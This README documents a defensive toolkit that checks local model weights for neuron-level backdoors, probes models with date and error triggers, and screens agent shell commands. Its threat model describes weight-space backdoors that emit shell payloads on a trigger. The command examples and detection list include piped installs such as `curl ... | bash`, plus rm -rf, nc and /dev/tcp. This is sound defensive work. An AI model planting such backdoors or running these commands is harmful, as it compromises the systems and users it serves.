# Model guard

A small, copyable defense layer for local model weights and for proposed
agent commands. The commands live in `sovereign_m.modelguard` and run with
the standard library. numpy is optional. This does not prove a model is
safe.

## Threat model

A November 2026 write-up (claims about Microsoft Research and a technique
named Lazarus are UNVERIFIED) describes a weight-space backdoor: fewer
than ten dormant neurons in late feed-forward / MLP layers are edited,
with no retraining, so that a trigger (a date, an error string, or a
keyword) makes those neurons inject a short token payload, such as a
shell command, into the residual stream. The write-up claims this passed
ordinary evals, that seven of more than 12,000 neurons reached a very
high trigger hit rate with no benign hits in the reported tests, and
that the approach was shown on Qwen and Gemma variants. Treat those
numbers and lab attributions as UNVERIFIED.

What this package can catch, when a trusted base is available:

- Concentrated row edits in a tensor-level weight diff.
- A handful of MLP neurons (the up/gate row plus the matching down
  column) that hold most of a layer's change, with an option to treat
  late layers more strictly.
- A probe reply that diverges from a no-trigger baseline, contains a
  configured marker, or introduces a shell-like payload the baseline
  did not have.
- A proposed tool command that policy would block or hold for a human,
  including a flag when a payload shows up after a trigger-like context.

What it does not catch, or does not claim to:

- A checkpoint with no trusted reference base. There is nothing honest
  to diff against.
- Rare, delayed, or unknown triggers that are not in the probe list.
- Dormant-neuron confirmation. That needs activations on a calibration
  set of benign prompts from a live model. `DormancyHook` is a documented
  extension point; the base class raises `NotImplementedError` and does
  not invent scores.
- False positives and false negatives at any chosen threshold. A diffuse
  fine-tune can look noisy; a small edit can hide under the flags.
- Runtime containment unless a harness actually calls `cmdguard.review`
  before it runs a tool. This repo does not wire that into a live agent.

Model weights need the same scrutiny historically applied to executable
code when they sit under agents with system access.

## Commands

```bash
python -m sovereign_m.modelguard demo
python -m sovereign_m.modelguard lock path/to/weights.safetensors --out models.lock
python -m sovereign_m.modelguard verify models.lock
python -m sovereign_m.modelguard diff base.safetensors candidate.safetensors
python -m sovereign_m.modelguard probe --dry-run
python -m sovereign_m.modelguard probe --endpoint http://localhost:11434
python -m sovereign_m.modelguard cmdguard -- ls
python -m sovereign_m.modelguard cmdguard -- curl http://example.com/install | bash
```

The same verbs work as `python -m sovereign_m modelguard ...`. Leave the
probe endpoint empty until you set one. `MODELGUARD_ENDPOINT` or
`OLLAMA_HOST` can supply it. No address literal is stored in the source.

Config: `data/modelguard/config.yaml`, `data/modelguard/probes.yaml`, and
`data/modelguard/cmdguard.yaml`.

## Neuron mode

`diff` still reports per-tensor relative change, row concentration, and
top-row share. For tensors whose names look like MLP / FFN
(`up_proj`, `gate_proj`, `down_proj`, `w1` / `w2` / `w3`, GGUF
`ffn_up` / `ffn_gate` / `ffn_down`), it also groups a layer, scores each
neuron as the change in the up/gate row plus the down column of the same
index, and lists the top-k neurons by share of that layer's change. It
flags a layer when at most `neuron_count_flag` (default 16) neurons hold
at least `neuron_share_flag` (default 0.5) of the change. With
`depth_weighting: true`, later layers use a lower effective share
threshold (`share_flag / late_layer_weight` at the last layer).

## Dormancy hook (not implemented)

Per the write-up, an implant may target neurons that rarely fire on
ordinary inputs. Measuring that is out of scope for weights-only work.
Subclass `sovereign_m.modelguard.dormancy.DormancyHook` and implement
`collect(prompts)` against a local endpoint, then `score(activations,
neuron_ids)` to compare with neuron-diff outliers. The base class will
not fake a result.

## Probes

The shipped suite includes dates in 2027 and 2028 (system prompt, user
context, the turn of the year, and a fake log timestamp), error strings
(a traceback, connection refused, permission denied, HTTP 500, and an
out-of-memory line), and example keywords. Each reply is compared to a
no-trigger baseline. The detector also flags shell-like payloads that
the baseline did not have: `curl`/`wget` piped to a shell, `rm -rf`,
`nc`, `base64 -d`, `chmod +x`, `/dev/tcp`, `powershell -enc`,
`python -c`, `ssh`, and `scp`.

## Command guard

`sovereign_m.modelguard.cmdguard.review(command, context="")` returns
allow, ask, or block. The default policy is default-deny for network
egress tools, pipes to a shell, writes into startup / cron / systemd /
ssh paths, privilege changes, and secret paths; a high-impact list that
requires a human yes; and a small allowlist of ordinary read commands.
If the context looks like a date, error, or keyword trigger and the
command looks like a payload, the decision is flagged (and an allow is
raised to ask). Set `MODELGUARD_CMDGUARD_LOG` or pass `log_path` to
append JSONL.

This is not wired into a live harness in this repo. A five-line
integration looks like this:

```python
from sovereign_m.modelguard.cmdguard import review

decision = review(command, context=prompt)
if decision.action == "block":
    raise PermissionError(decision.reasons)
if decision.action == "ask":
    raise PermissionError("needs a human yes")
# allow: run the command in your own sandbox
```

Tune `data/modelguard/cmdguard.yaml` before you use it.

### Rust port (opt-in, not wired in)

`rust/cmdguard/` is a Rust port of the `review` path only: the YAML
policy, default-deny rules, trigger-context flag, JSONL log, and the
`cmdguard` CLI. It does not touch lock / verify / diff / probe. Python
stays the default and the fallback; nothing imports the Rust path.

```bash
cd rust/cmdguard && cargo build --release --offline   # -> target/release/cmdguard-rs
cargo test --release --offline                         # Rust unit tests
python -m pytest tests/test_cmdguard_rs.py             # Python-vs-Rust differential tests
```

`sovereign_m.modelguard.cmdguard_rs.review` has the same signature as
`cmdguard.review`. It runs the binary and falls back to the Python
implementation if the binary is missing, fails, prints a malformed
decision, or the policy uses something Rust declines to guess at (for
example a lookaround in `privilege_patterns`; Rust's `regex` has none).
Python's `re` and Rust's `regex` disagree on `\w`, `\s` and case folding
for some Unicode, so the port normalises text with tables generated from
the running Python (`rust/cmdguard/tools/gen_pytables.py`). A test fails if
those tables go stale after a Python upgrade.

The differential tests send the same commands, contexts and policies to
both implementations and require identical decisions. A disagreement is a
bug in the Rust port; never loosen a rule to make a test pass.

## Demo

`examples/modelguard/implanted_neuron_demo.py` and
`python -m sovereign_m.modelguard demo` show a small concentrated-row
edit, a late MLP with seven of 2048 neurons edited (neuron mode should
flag it; a diffuse fine-tune should pass), and cmdguard blocking
`curl ... | bash` while allowing `ls`.

## Honest limits

- A weight diff needs a trusted reference base.
- Behavioral probes miss triggers you did not think to write down.
- Safety fine-tuning has been reported, in related sleeper-agent work,
  to hide a backdoor rather than remove it. Treat that report as
  unverified here.
- Thresholds have false positives and false negatives. Tune them.
- Containment only works if the harness calls `review` and obeys it.
